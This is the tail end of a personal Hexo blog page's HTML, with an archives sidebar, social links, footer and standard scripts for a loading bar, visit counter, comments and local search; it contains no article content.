href="/archives/2017/07/">July 2017<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/05/">May 2017<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/04/">April 2017<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/03/">March 2017<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2016/07/">July 2016<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2016/04/">April 2016<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2016/03/">March 2016<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2016/02/">February 2016<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2015/12/">December 2015<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2015/11/">November 2015<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2015/05/">May 2015<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2015/04/">April 2015<span class="sidebar_archives-count">1</span></a>
        </ul>
    </li>

    <!-- Divider -->
    <li class="divider"></li>


    <!-- Pages  -->
	
		<li>
			<a href="http://thehackercat.deercv.com/" title="About me">
				About me
			</a>
		</li>
	

    <!-- Article Numebr  -->
    <li>
        <a href="/archives">
             Article Number
             <span class="sidebar-badge">33</span>
        </a>
    </li>
</ul>

		<!-- Sidebar Divider -->
		<div class="sidebar-divider"></div>

		<!-- Sidebar Footer -->
		<!-- 
I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright, I will thank you so much.
If you still want to delete the copyrights, could you still retain the first one? Which namely "Theme Material"
It will not impact the appearance and can give developers a lot of support :)

很高兴您使用并喜欢该主题，开发不易 十分谢谢与希望您可以保留一下版权声明。
如果您仍然想删除的话 能否只保留第一项呢？即 "Theme Material"
它不会影响美观并可以给开发者很大的支持。 :) 
-->

<!-- Theme Material -->
<a href="https://github.com/viosey/hexo-theme-material"  class="sidebar-footer-text-a" target="_blank">
	<div class="sidebar-text mdl-button mdl-js-button mdl-js-ripple-effect sidebar-footer-text-div" data-upgraded=",MaterialButton,MaterialRipple">
		Theme - Material
		<span class="sidebar-badge badge-circle">i</span>
	</div>
</a>

<!-- Help & Support -->
<!--
<a href="mailto:hiviosey@gmail.com" class="sidebar-footer-text-a">
    <div class="sidebar-text mdl-button mdl-js-button mdl-js-ripple-effect sidebar-footer-text-div" data-upgraded=",MaterialButton,MaterialRipple">
		sidebar.help
		<span class="mdl-button__ripple-container">
			<span class="mdl-ripple"></span>
		</span>
	</div>
</a>
-->

<!-- Feedback -->
<!--
<a href="https://github.com/viosey/hexo-theme-material/issues" target="_blank" class="sidebar-footer-text-a">
    <div class="sidebar-text mdl-button mdl-js-button mdl-js-ripple-effect sidebar-footer-text-div" data-upgraded=",MaterialButton,MaterialRipple">
         sidebar.feedback
                    <span class="mdl-button__ripple-container"><span class="mdl-ripple"></span></span></div>
</a>
-->

<!-- Abount Theme -->
<!--
<a href="https://blog.viosey.com/index.php/Material.html" target="_blank" class="sidebar-footer-text-a">
    <div class="sidebar-text mdl-button mdl-js-button mdl-js-ripple-effect sidebar-footer-text-div" data-upgraded=",MaterialButton,MaterialRipple">
         sidebar.about_theme
        <span class="mdl-button__ripple-container"><span class="mdl-ripple"></span></span></div>
</a>-->

	</div>
    
    <!-- Sidebar Sponsor -->
    


</aside>

				
				
				
					<!-- Footer Top Button -->
					<div class="toTop-wrap">
    <a href="#top" class="toTop">
        <i class="material-icons footer_top-i">expand_less</i>
    </a>
</div>
				
				
				<!--Footer-->
<footer class="mdl-mini-footer" id="bottom">
	
	
		<!-- Paradox Footer Left Section -->
		<div class="mdl-mini-footer--left-section sns-list">
    <!-- Twitter -->
    
    
    
    <!-- Facebook -->
    
    
    
    <!-- Google + -->
    
    

    <!-- Weibo -->
    
    
    
    <!-- Instagram -->
    
    <a href="https://www.instagram.com/thehackercat" target="view_window"><button class="mdl-mini-footer--social-btn social-btn" style="background-image: url(/img/footer/footer_ico-instagram.png);">
        <span class="visuallyhidden">Instagram</span>
    </button></a>
    
    
    <!-- Tumblr -->
    
    
    
    <!-- Github -->
    
    <a href="https://github.com/thehackercat" target="view_window"><button class="mdl-mini-footer--social-btn social-btn" style="background-image: url(/img/footer/footer_ico-github.png);">
        <span class="visuallyhidden">Github</span>
    </button></a>
    

    <!-- Douban -->
    
    <a href="https://www.douban.com/people/thehackercat" target="view_window"><button class="mdl-mini-footer--social-btn social-btn" style="background-image: url(/img/footer/footer_ico-douban.png);">
        <span class="visuallyhidden">Douban</span>
    </button></a>
    
</div>


		<!--Copyright-->
		<div id="copyright">Copyright&nbsp;©&nbsp;<script type="text/javascript">var fd = new Date();document.write(fd.getFullYear());</script>&nbsp;LexusLee's Blog</div>

		<!-- Paradox Footer Right Section -->

		<!-- 
		I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright.
		It will not impact the appearance and can give developers a lot of support :)

		很高兴您使用该主题，开发不易，希望您可以保留一下版权声明。
		它不会影响美观并可以给开发者很大的支持。 :) 
		-->

		<div class="mdl-mini-footer--right-section">
			<div>
				<div class="footer-develop-div">Powered by <a href="https://hexo.io" target="_blank" class="footer-develop-a">Hexo</a></div>
				<div class="footer-develop-div">Theme - <a href="https://github.com/viosey/hexo-theme-material" target="_blank" class="footer-develop-a">Material</a></div>
			</div>
		</div>
	
    
</footer>
                
				<!-- Import File -->
<script src="/js/highlight.min.js"></script>
<script src="/js/js.min.js"></script>
<script src="/js/nprogress.js"></script>

<script type="text/javascript">
    NProgress.configure({
        showSpinner: true
    });
    NProgress.start();
    
    $('#nprogress .bar').css({
        'background': '#FF4081'
    });
    $('#nprogress .peg').css({
        'box-shadow': '0 0 10px #FF4081, 0 0 15px #FF4081'
    });
    $('#nprogress .spinner-icon').css({
        'border-top-color': '#FF4081',
        'border-left-color': '#FF4081'
    });
    
    setTimeout(function() {
        NProgress.done();
        $('.fade').removeClass('out');
    }, 800);
</script>






    <!-- Busuanzi -->
    <script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>





    <!-- 使用 DISQUS js 代码 -->
	<script id="dsq-count-scr" src="//thehackercat.disqus.com/count.js" async></script>


<!-- Swiftye -->


<!-- Local Search-->

	<script>
	var searchFunc = function(path, search_id, content_id) {
    'use strict';
    $.ajax({
        url: path,
        dataType: "xml",
        success: function( xmlResponse ) {
            // get the contents from search data
            var datas = $( "entry", xmlResponse ).map(function() {
                return {
                    title: $( "title", this ).text(),
                    content: $("content",this).text(),
                    url: $( "url" , this).text()
                };
            }).get();
            var $input = document.getElementById(search_id);
            var $resultContent = document.getElementById(content_id);
            $input.addEventListener('input', function(){
                var str='<ul class=\"search-result-list\">';                
                var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                $resultContent.innerHTML = "";
                if (this.value.trim().length <= 0) {
                    return;
                }
                // perform local searching
                datas.forEach(function(data) {
                    var isMatch = true;
                    var content_index = [];
                    var data_title = data.title.trim().toLowerCase();
                    var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
                    var data_url = data.url;
                    var index_title = -1;
                    var index_content = -1;
                    var first_occur = -1;
                    // only match artiles with not empty titles and contents
                    if(data_title != '' && data_content != '') {
                        keywords.forEach(function(keyword, i) {
                            index_title = data_title.indexOf(keyword);
                            index_content = data_content.indexOf(keyword);
                            if( index_title < 0 && index_content < 0 ){
                                isMatch = false;
                            } else {
                                if (index_content < 0) {
                                    index_content = 0;
                                }
                                if (i == 0) {
                                    first_occur = index_content;
                                }
                            }
                        });
                    }
                    // show search results
                    if (isMatch) {
                        str += "<li><a href='"+ data_url +"' class='search-result-title' target='_blank'>"+ data_title;
                        var content = data.content.trim().replace(/<[^>]+>/g,"");
                        if (first_occur >= 0) {
                            // cut out characters
                            var start = first_occur - 6;
                            var end = first_occur + 6;
                            if(start < 0){
                                start = 0;
                            }
                            if(start == 0){
                                end = 10;
                            }
                            if(end > content.length){
                                end = content.length;
                            }
                            var match_content = content.substr(start, end); 
                            // highlight all keywords
                            keywords.forEach(function(keyword){
                                var regS = new RegExp(keyword, "gi");
                                match_content = match_content.replace(regS, "<em class=\"search-keyword\">"+keyword+"</em>");
                            })
                            str += "<p class=\"search-result\">" + match_content +"...</p>" +"</a>";
                        }
                    }
                })
                $resultContent.innerHTML = str;
            })
        }
    })
}
</script>

	<script>
        var inputArea = document.querySelector("#search");
        var getSearchFile = function(){
            var path = "search.xml";
            searchFunc(path, 'search', 'local-search-result');
        }

        inputArea.onfocus = function(){ getSearchFile() }
	</script>


<!-- Window Load-->
<script>
    $(window).load(function() {
        // Post_Toc parent position fixed
        $(".post-toc-wrap").parent(".mdl-menu__container").css("position", "fixed");
    });
</script>
            </main>
        </div>
		
    </body>
		
	
</html>
